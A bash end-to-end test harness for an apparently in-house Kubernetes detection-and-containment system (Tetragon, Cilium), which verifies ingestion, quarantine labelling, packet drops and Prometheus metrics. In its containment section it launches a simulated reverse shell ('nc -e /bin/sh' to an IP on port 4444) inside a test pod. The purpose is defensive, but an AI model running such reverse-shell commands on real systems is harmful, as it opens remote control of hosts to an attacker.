#!/usr/bin/env bash
# ==============================================================================
# ZTRE Automated Kubernetes Cluster End-to-End Environment Test
# Evaluates: Stage 1 (Infra/eBPF), Stage 2 (Event Ingestion),
#            Stage 2.5 (Discovery), Stage 3 (Validation & Scoring),
#            Stage 4 (Decision Engine & Automated Network Containment)
# ==============================================================================
set -euo pipefail

COLOR_GREEN="\033[0;32m"
COLOR_RED="\033[0;31m"
COLOR_YELLOW="\033[0;33m"
COLOR_BLUE="\033[0;34m"
COLOR_RESET="\033[0m"

pass_count=0
fail_count=0

log_info()  { echo -e "${COLOR_BLUE}[INFO]${COLOR_RESET} $*"; }
log_pass()  { echo -e "${COLOR_GREEN}[PASS]${COLOR_RESET} $*"; pass_count=$((pass_count + 1)); }
log_fail()  { echo -e "${COLOR_RED}[FAIL]${COLOR_RESET} $*"; fail_count=$((fail_count + 1)); }
log_warn()  { echo -e "${COLOR_YELLOW}[WARN]${COLOR_RESET} $*"; }

echo "======================================================================"
echo "    ZTRE Kubernetes Cluster End-to-End Stage 1-4 Test Harness        "
echo "======================================================================"

# ------------------------------------------------------------------------------
# 1. Pre-flight Cluster Health Checks (Stage 1 Infrastructure)
# ------------------------------------------------------------------------------
log_info "1. Verifying cluster infrastructure readiness..."

# Check Node readiness
NODES_READY=$(kubectl get nodes --no-headers | awk '{print $2}' | grep -v 'Ready' || true)
if [ -z "$NODES_READY" ]; then
    log_pass "All Kubernetes nodes are Ready"
else
    log_fail "Some nodes are not Ready: $NODES_READY"
fi

# Check Tetragon eBPF DaemonSet
TETRAGON_PODS=$(kubectl get pods -n kube-system -l app.kubernetes.io/name=tetragon --field-selector=status.phase=Running --no-headers | wc -l)
if [ "$TETRAGON_PODS" -ge 1 ]; then
    log_pass "Tetragon eBPF sensors running ($TETRAGON_PODS pods)"
else
    log_fail "Tetragon eBPF pods not running in kube-system"
fi

# Check Cilium Network Policy (Stage 1 quarantine enforcement rule)
if kubectl get ciliumclusterwidenetworkpolicy ztre-quarantine-policy >/dev/null 2>&1; then
    log_pass "Cilium quarantine cluster policy active (ztre/quarantine selector)"
else
    log_fail "Cilium quarantine policy missing"
fi

# Check ZTRE Agent DaemonSet
AGENT_POD=$(kubectl get pods -n ztre-system -l app.kubernetes.io/name=ztre-agent --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
if [ -n "$AGENT_POD" ]; then
    log_pass "ZTRE Agent pod active: $AGENT_POD"
else
    log_fail "ZTRE Agent DaemonSet has no running pods in ztre-system"
    exit 1
fi

AGENT_IP=$(kubectl get pod -n ztre-system "$AGENT_POD" -o jsonpath='{.status.podIP}')
AGENT_NODE=$(kubectl get pod -n ztre-system "$AGENT_POD" -o jsonpath='{.spec.nodeName}')
log_info "ZTRE Agent Target: IP=$AGENT_IP on Node=$AGENT_NODE"

# ------------------------------------------------------------------------------
# 2. Stage 2 Verification: Tetragon gRPC Stream & Event Interception
# ------------------------------------------------------------------------------
log_info "2. Verifying event ingestion pipeline (Stage 2 / FR-01)..."

STREAM_STATUS=$(kubectl logs -n ztre-system "$AGENT_POD" | grep "Tetragon gRPC event stream established successfully" || true)
if [ -n "$STREAM_STATUS" ]; then
    log_pass "Tetragon gRPC stream established over unix domain socket"
else
    log_fail "Tetragon gRPC stream initialization message not found in agent logs"
fi

# ------------------------------------------------------------------------------
# 3. Stage 2.5 Verification: Behavioral Discovery & Baseline Learning
# ------------------------------------------------------------------------------
log_info "3. Verifying behavioral discovery engine (Stage 2.5)..."

DISCOVERY_LOG=$(kubectl logs -n ztre-system "$AGENT_POD" | grep -E "baseline snapshot restored|baseline snapshot saved" || true)
if [ -n "$DISCOVERY_LOG" ]; then
    log_pass "Behavioral baseline store & snapshot persistence operational"
else
    log_warn "No snapshot logs in current container session yet (checking status)"
fi

# ------------------------------------------------------------------------------
# 4. Stage 3 & 4 Verification: Live Attack, Decision & Containment Execution
# ------------------------------------------------------------------------------
log_info "4. Testing automated containment on simulated attack workload..."

# Cleanup old test pods
kubectl delete pod stage4-victim stage4-target -n ztre-test --ignore-not-found=true --wait=true >/dev/null 2>&1 || true

# Launch victim pod and target pod
kubectl run stage4-target -n ztre-test --image=alpine --restart=Never \
    --overrides="{\"spec\":{\"nodeName\":\"$AGENT_NODE\"}}" \
    -- nc -l -p 8080 -k -e /bin/echo 'alive' >/dev/null 2>&1

kubectl run stage4-victim -n ztre-test --image=alpine --restart=Never \
    --overrides="{\"spec\":{\"nodeName\":\"$AGENT_NODE\"}}" \
    -- sleep 3600 >/dev/null 2>&1

kubectl wait --for=condition=Ready pod/stage4-target -n ztre-test --timeout=30s >/dev/null 2>&1
kubectl wait --for=condition=Ready pod/stage4-victim -n ztre-test --timeout=30s >/dev/null 2>&1

TARGET_IP=$(kubectl get pod stage4-target -n ztre-test -o jsonpath='{.status.podIP}')

# Verify pre-containment baseline: victim can reach target
PRE_CHECK=$(kubectl exec -n ztre-test stage4-victim -- /bin/sh -c "nc -z -w 2 $TARGET_IP 8080; echo status:\$?" 2>/dev/null || true)
if echo "$PRE_CHECK" | grep -q "status:0"; then
    log_pass "Pre-containment network connectivity verified (pod-to-pod functional)"
else
    log_warn "Pre-containment network check indeterminate: $PRE_CHECK"
fi

# Trigger attack in victim pod: reverse shell simulation
log_info "Triggering attack payload (reverse shell simulation) in stage4-victim..."
ATTACK_START=$(date +%s)
kubectl exec -n ztre-test stage4-victim -- /bin/sh -c 'nc -e /bin/sh 10.91.128.10 4444' >/dev/null 2>&1 || true

sleep 2

# Step A: Check if pod got labeled with ztre/quarantine=true
VICTIM_LABELS=$(kubectl get pod stage4-victim -n ztre-test -o jsonpath='{.metadata.labels}')
if echo "$VICTIM_LABELS" | grep -q '"ztre/quarantine":"true"'; then
    log_pass "Stage 4 Containment: Pod labeled with ztre/quarantine: true"
else
    log_fail "Stage 4 Containment: Pod did not receive quarantine label: $VICTIM_LABELS"
fi

# Step B: Check if pod is still RUNNING (preserves forensics, zero SIGKILL)
VICTIM_STATUS=$(kubectl get pod stage4-victim -n ztre-test -o jsonpath='{.status.phase}')
VICTIM_RESTARTS=$(kubectl get pod stage4-victim -n ztre-test -o jsonpath='{.status.containerStatuses[0].restartCount}')
if [ "$VICTIM_STATUS" = "Running" ] && [ "$VICTIM_RESTARTS" -eq 0 ]; then
    log_pass "NFR-01 Safety Check: Pod remains Running with 0 restarts (process preserved, zero SIGKILL)"
else
    log_fail "Pod status abnormal: status=$VICTIM_STATUS, restarts=$VICTIM_RESTARTS"
fi

# Step C: Poll until Cilium eBPF data plane drops network traffic (up to 30s)
log_info "Verifying Cilium eBPF data plane packet drop (polling up to 30s)..."
DROP_CONFIRMED=false
for i in $(seq 1 30); do
    POST_CHECK=$(kubectl exec -n ztre-test stage4-victim -- /bin/sh -c "nc -z -w 1 $TARGET_IP 8080; echo status:\$?" 2>/dev/null || echo "status:1")
    if echo "$POST_CHECK" | grep -q "status:1"; then
        DROP_CONFIRMED=true
        TOTAL_LATENCY=$(( $(date +%s) - ATTACK_START ))
        log_pass "Stage 4 Enforcement: Network containment ACTIVE (Cilium eBPF dropped egress packets after ~${TOTAL_LATENCY}s)"
        break
    fi
    sleep 1
done

if [ "$DROP_CONFIRMED" = false ]; then
    log_fail "Post-containment network check timed out after 30s without packet drop"
fi

# Step D: Check Agent logs for containment latency
AGENT_CONTAIN_LOG=$(kubectl logs -n ztre-system "$AGENT_POD" --tail=30 | grep "AUTOMATED CONTAINMENT EXECUTED SUCCESSFULLY" | grep "stage4-victim" || true)
if [ -n "$AGENT_CONTAIN_LOG" ]; then
    log_pass "Agent confirmed containment execution in logs: $AGENT_CONTAIN_LOG"
else
    log_warn "Containment confirmation log not in tail"
fi

# Cleanup test pods
kubectl delete pod stage4-victim stage4-target -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true

# ------------------------------------------------------------------------------
# 5. Prometheus Observability Metrics Verification (:9090/metrics)
# ------------------------------------------------------------------------------
log_info "5. Verifying Prometheus metrics endpoint on ZTRE Agent..."

METRICS_OUTPUT=$(ssh -o BatchMode=yes node2@10.91.128.11 "curl -s http://${AGENT_IP}:9090/metrics" 2>/dev/null || true)

if [ -n "$METRICS_OUTPUT" ]; then
    log_pass "Successfully scraped HTTP metrics from agent :9090"

    # Check collector metrics
    if echo "$METRICS_OUTPUT" | grep -q "ztre_collector_events_ingested_total"; then
        INGESTED=$(echo "$METRICS_OUTPUT" | grep "ztre_collector_events_ingested_total" | awk '{sum+=$2} END {print sum}')
        log_pass "Metric: ztre_collector_events_ingested_total = $INGESTED"
    fi

    # Check containment actions metric
    if echo "$METRICS_OUTPUT" | grep -q "ztre_containment_actions_total"; then
        CONTAIN_COUNT=$(echo "$METRICS_OUTPUT" | grep "^ztre_containment_actions_total" | awk '{print $2}')
        log_pass "Metric: ztre_containment_actions_total = $CONTAIN_COUNT (> 0)"
    fi

    # Check alerts dispatched metric
    if echo "$METRICS_OUTPUT" | grep -q "ztre_decision_alerts_dispatched_total"; then
        log_pass "Metric: ztre_decision_alerts_dispatched_total present"
    fi

    # Check api errors metric
    if echo "$METRICS_OUTPUT" | grep -q "ztre_containment_api_errors_total"; then
        API_ERRORS=$(echo "$METRICS_OUTPUT" | grep "^ztre_containment_api_errors_total" | awk '{print $2}')
        if [ "$API_ERRORS" -eq 0 ]; then
            log_pass "Metric: ztre_containment_api_errors_total = 0 (clean API operations)"
        else
            log_warn "Metric: ztre_containment_api_errors_total = $API_ERRORS"
        fi
    fi
else
    log_fail "Unable to scrape metrics endpoint from http://${AGENT_IP}:9090/metrics"
fi

# ------------------------------------------------------------------------------
# Final Test Summary
# ------------------------------------------------------------------------------
echo "======================================================================"
echo -e "Test Results: ${COLOR_GREEN}${pass_count} PASSED${COLOR_RESET}, ${COLOR_RED}${fail_count} FAILED${COLOR_RESET}"
echo "======================================================================"

if [ "$fail_count" -eq 0 ]; then
    echo -e "${COLOR_GREEN}>> ALL STAGES (1, 2, 2.5, 3, 4) VERIFIED ON LIVE KUBERNETES CLUSTER! <<${COLOR_RESET}"
    exit 0
else
    echo -e "${COLOR_RED}>> SOME TEST CHECKS FAILED <<${COLOR_RESET}"
    exit 1
fi
